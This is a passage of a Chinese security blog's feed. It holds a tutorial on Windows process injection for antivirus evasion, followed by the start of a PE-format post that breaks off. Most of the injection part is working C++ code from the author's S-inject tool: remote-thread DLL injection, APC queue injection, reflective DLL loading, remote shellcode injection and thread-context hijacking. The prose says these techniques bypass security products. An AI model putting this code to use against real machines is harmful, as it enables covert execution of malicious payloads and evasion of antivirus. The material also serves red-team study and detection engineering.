class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="comment">//3.向2中开辟的内存空间写入dll路径</span></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">c_str</span>(), <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">size</span>() + <span class="number">1</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.从ntdll导出 LoadLibraryA 函数</span></span><br><span class="line">    HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(Ntdll, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.创建远程进程</span></span><br><span class="line">    HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//6.等待远程线程执行</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">500</span>);</span><br><span class="line">    <span class="comment">//7.释放资源</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/677295bb4d611e870b33459c107eff71.png" alt="image-20240930085635572" /></p><p>那么同样的原理，加载完成DLL后，如何卸载该DLL呢？，可以使用windows提供的函数<code>FreeLibrary</code>，具体原理类似，读者不妨自己实现一下</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L156">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L156</a></p><h2 id="apc注入"><a class="markdownIt-Anchor" href="#apc注入"></a> APC注入</h2><p>这里就是利用<code>KiUserDispatch</code>调度进行APC例程调用，让线程使用<code>LoadLibarary</code>进行注入</p><p>关于Windows APC队列更深入的了解：<a href="https://www.anquanke.com/post/id/247813">https://www.anquanke.com/post/id/247813</a></p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L304">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L304</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ApcInject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x300</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">c_str</span>(), <span class="keyword">this</span>-&gt;DllPath.<span class="built_in">size</span>() + <span class="number">1</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(Ntdll, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">    HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    BOOL bStat = FALSE;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到第一个线程</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (te.th32OwnerProcessID == pid) &#123;</span><br><span class="line">                hThread = <span class="built_in">OpenThread</span>(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="comment">//插入APC队列</span></span><br><span class="line">                DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryBase, hThread, (ULONG_PTR)pAddress);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)bStat = TRUE;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个技巧就是使用NTDLL中的未导出函数<code>NtTestAlert</code>就可以立即调用APC例程，这个方法的好处就是绕过了<code>createRemoteThread</code>的API调用，使用了<code>QueueUserAPC</code>进行创建，但是可能会出现APC队列阻塞。也是一个比较入门的免杀手法。</p><h2 id="上下文注入"><a class="markdownIt-Anchor" href="#上下文注入"></a> 上下文注入</h2><p>如果你之前在写PE加载器的话，那么自然而然的就想到这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了，<strong>这部分为了理解简单会放到shellcode注入中讲解</strong></p><p>用到的主要WINAPI就是</p><ol><li>创建会shellcode裸函数（<code>__declspec(naked)</code>）,导出<code>LoadLibrary</code>等函数</li><li><code>OpenProcess</code>后再<code>OpenThread</code>，使用<code>SuspendThread</code>暂停线程</li><li>创建类型为<code>CONTEXT</code>的变量，初始化<code>context.ContextFlags=CONTEXT_FULL</code></li><li><code>GetThreadContext</code>获得上下文</li><li><code>VirualAlloc</code>获得空间，类似<code>RtlMoveMemory</code>这种复制shellcode到空间</li><li>将<code>context.eip = shellcode_addr</code>，使用<code>SetThreadContext</code>重新设置上下文，<code>ResumeThread</code>恢复线程</li></ol><h2 id="反射dll注入"><a class="markdownIt-Anchor" href="#反射dll注入"></a> 反射DLL注入</h2><p>比较复杂的一种方法，也是注入、免杀成功率比较高的一种方法</p><p>首先需要了解DLL加载过后的格式，我这里随意举个使用d3d11.dll的例子</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/50aa74f90a8c413bac1171f26991f3b2.png" alt="image-20240930091929059" /></p><p>神奇的是加载后的DLL在进程内存和文件中的存储是一致的，我们则可以利用这一特性，仿照<code>loadlibaray</code>进行自己函数的装载，这里结合 <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 讲解</p><p>由于上面的分析可以得到大致步骤</p><ol><li>使用<code>CreatFile</code>读取DLL文件，并将内容加载到远程进程</li><li>找到指定函数的偏移位置（类似于<code>DllMain</code>）</li><li>使用<code>createRemoteThread</code>或者其他方法进行注入</li></ol><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L205">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L205</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ReflectInject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="keyword">this</span>-&gt;DllPath.<span class="built_in">c_str</span>(), GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">    LPVOID pBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize];</span><br><span class="line">    DWORD dwReadSize;</span><br><span class="line"></span><br><span class="line">    DWORD dwReflectiveLoaderOffset = <span class="keyword">this</span>-&gt;<span class="built_in">dwGetOffset</span>(buffer, (CHAR*)<span class="string">&quot;ReflectiveLoader&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);</span><br><span class="line">    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">1024</span> * <span class="number">1024</span>, lpReflectiveLoader, pBase, (DWORD)<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于<code>dwGetOffset</code>函数 <a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L775">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L775</a> 主要是PE文件格式<code>RVA</code>那套东西，本片文章不再赘述</p><p>回到反射式注入，我们的DLL并没有直接调用<code>DllMain</code>，而是先调用了<code>ReflectiveLoader</code>这个函数</p><p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L51">https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L51</a></p><p>函数主要是从Ldr遍历链上dll，找到一些关键函数例如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// we stop searching when we have found everything we need.</span></span><br><span class="line"><span class="keyword">if</span>( pLoadLibraryA &amp;&amp; pGetProcAddress &amp;&amp; pVirtualAlloc &amp;&amp; pNtFlushInstructionCache )</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>之后利用这个API来加载PE文件，大致步骤就是这样的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3f06631c00f5d4eb665ece903df9d1f4.png" alt="image-20240930094325881" /></p><p>最后跳转到映射好的DllMain中执行</p><p>这种方法的好处十分明显，在远程进程中进行映射，而且由于只需要将内容写入远程进程，所以适合从网络加载，对免杀有好处。缺点自然就是构造dll较为复杂，因为需要一个loader去加载</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8fdbc55fb2225d8105c30006a7e59c06.png" alt="image-20240930095417856" /></p><h1 id="b-shellcode注入"><a class="markdownIt-Anchor" href="#b-shellcode注入"></a> B. Shellcode注入</h1><p>这里复习下远程线程调用注入的步骤</p><ol><li>将dll的路径写入远程的进程(待注入的进程)</li><li>获得远程进程<code>LoadLibraryA</code>函数的地址</li><li>使用<code>createRemoteThread </code>创建新的进程</li></ol><p>有趣的是如果我们在步骤2中传入的不是远程进程<code>LoadLibraryA</code>函数的地址，而是远程的shellcode地址，这让整个情况变得有意思起来，这样就可以使用远程进程加载shellcode了</p><p>这里举个例子</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L472">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L472</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ShellcodeInject</span><span class="params">(string basedsc, DWORD pid)</span> </span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line"></span><br><span class="line">    string shellcode = <span class="built_in">Base64Decode</span>(basedsc);</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    DWORD size = shellcode.<span class="built_in">size</span>() + <span class="number">1</span>;</span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, shellcode.<span class="built_in">c_str</span>(), size - <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)pAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hRemoteProcess, INFINITE);</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, shellcode.<span class="built_in">size</span>() + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好，这里就可以看下关于上下文注入了</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L585">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L585</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ContextShellcodeInject</span><span class="params">(string basedsc, DWORD pid)</span> </span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line"></span><br><span class="line">    string shellcode = <span class="built_in">Base64Decode</span>(basedsc);</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    DWORD size = shellcode.<span class="built_in">size</span>() + <span class="number">1</span>;</span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, shellcode.<span class="built_in">c_str</span>(), size - <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    shellcode = <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">    HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    BOOL bStat = FALSE;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">    CONTEXT context = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    context.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到第一个线程(main thread)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">        <span class="comment">//main thread can not be hijacked</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (te.th32OwnerProcessID == pid) &#123;</span><br><span class="line">                hThread = <span class="built_in">OpenThread</span>(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">                DWORD lpflOldProtect;</span><br><span class="line">                <span class="built_in">VirtualProtectEx</span>(hProcess, pAddress, (SIZE_T)size + <span class="number">1</span>, PAGE_EXECUTE, &amp;lpflOldProtect);</span><br><span class="line">                dwRet = <span class="built_in">SuspendThread</span>(hThread);</span><br><span class="line"></span><br><span class="line">                dwRet = <span class="built_in">GetThreadContext</span>(hThread, &amp;context);</span><br><span class="line">                </span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">                context.Rip = (DWORD64)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                context.Eip = (DWORD)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _WIN64</span></span></span><br><span class="line">                dwRet = <span class="built_in">SetThreadContext</span>(hThread, &amp;context);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码在于</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                dwRet = <span class="built_in">SuspendThread</span>(hThread);</span><br><span class="line">                dwRet = <span class="built_in">GetThreadContext</span>(hThread, &amp;context);</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">                context.Rip = (DWORD64)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                context.Eip = (DWORD)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _WIN64</span></span></span><br><span class="line">                dwRet = <span class="built_in">SetThreadContext</span>(hThread, &amp;context);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">ResumeThread</span>(hThread);</span><br></pre></td></tr></table></figure><p>和APC注入一样，便利了线程，然后选择一个线程暂停他(<code>SuspendThread</code>)，然后获得当前线程的上下文，上下文包含了寄存器信息，然后我们就该他的<code>ip</code>寄存器，这样恢复线程后的，下一条指令就是我们的shellcode的地方。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ&quot;&gt;https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PE文件格式解析</title>
    <link href="https://joe1sn.eu.org/2024/10/01/pe_format/"/>
    <id>https://joe1sn.eu.org/2024/10/01/pe_format/</id>
    <published>2024-10-01T06:50:28.000Z</published>
    <updated>2025-02-27T07:15:40.385Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="pe文件格式解析"><a class="markdownIt-Anchor" href="#pe文件格式解析"></a> PE文件格式解析</h1><p>假如说我们要自己写一个exe文件的加载器，或者你曾好奇过反汇编软件的原理，这就需要对exe对应的PE(Portable Executable)文件格式加以理解。这里以windows10中自带的notepad.exe进行讲解。</p><p>​这里：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format</a><br />是微软官方对PE格式的官方文档，读者可自行了解。</p><h2 id="如何确定是一个pe文件-dos头"><a class="markdownIt-Anchor" href="#如何确定是一个pe文件-dos头"></a> 如何确定是一个PE文件-DOS头</h2><p>对于一个PE文件，首先是他的文件头，也叫DOS 头，结构体定义如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     // Magic number</span><br><span class="line">//....</span><br><span class="line">    LONG   e_lfanew;                    // File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><ul><li><code>e_magic</code>：魔数，如果为<code>MZ</code>这个值说明DOS头正确</li><li><code>e_lfanew</code>：指向下一个头，即<code>NT</code>头的位置，计算方式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>T</mi><mi mathvariant="normal">_</mi><mi>H</mi><mi>E</mi><mi>A</mi><mi>D</mi><mi>E</mi><mi>R</mi><mo>=</mo><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>S</mi><mi>t</mi><mi>a</mi><mi>r</mi><mi>t</mi><mo>+</mo><mi>e</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>f</mi><mi>a</mi><mi>n</mi><mi>e</mi><mi>w</mi></mrow><annotation encoding="application/x-tex">NT\_HEADER = FileStart+e\_lfanew</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span></li></ul><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103095435314.png" alt="image-20250103095435314" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 